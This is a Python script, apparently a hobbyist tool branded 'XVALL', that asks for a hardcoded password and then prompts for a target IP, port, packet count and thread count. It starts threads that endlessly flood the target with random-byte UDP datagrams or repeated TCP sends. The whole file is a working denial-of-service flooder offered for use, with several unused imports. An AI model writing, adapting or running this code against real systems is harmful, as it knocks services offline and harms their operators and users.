#!/usr/bin/env python3
import random
import socket
import threading
import sys
import time
import os
import json
import platform as plt
from re import findall
from base64 import b64decode
from datetime import datetime
from json import loads, dumps
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen

#login tools
password ="XVALLCP"

for i in range(126):
	pwd = input("[•] PASSWORD ACCOUNT : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] WAIT A MOMENT !!! ")
		break
	else:
		time.sleep(5)
		print("[×] WRONG PASSWORD!!! ")
		continue
time.sleep(5)
print("[+] Done Login Account T-XVAll With Password : \u001b[33mXVALLCP")
time.sleep(5)

os.system("clear")
print("""
██╗░░██╗██╗░░░██╗░█████╗░██╗░░░░░██╗░░░░░
╚██╗██╔╝██║░░░██║██╔══██╗██║░░░░░██║░░░░░
░╚███╔╝░╚██╗░██╔╝███████║██║░░░░░██║░░░░░
░██╔██╗░░╚████╔╝░██╔══██║██║░░░░░██║░░░░░
██╔╝╚██╗░░╚██╔╝░░██║░░██║███████╗███████╗
╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝ """)

ip = str(input(" IP TARGET:"))
port = int(input(" PORT TARGET:"))
choice = str(input(" WHAT SHOULD WE START?(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" THREAD:"))
def run():
	data = random._urandom(1409)
	i = random.choice(("IM XVALL BRO!!!"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" HI BRO, IM XVALL!!!")
		except:
			print("[X] XVALL ALWAYS ALONE!!!")

def run2():
	data = random._urandom(18)
	i = random.choice(("IM XVALL BRO!!!"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" HI BRO, IM XVALL!!!")
		except:
			s.close()
			print("[X] XVALL ALWAYS ALONE!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
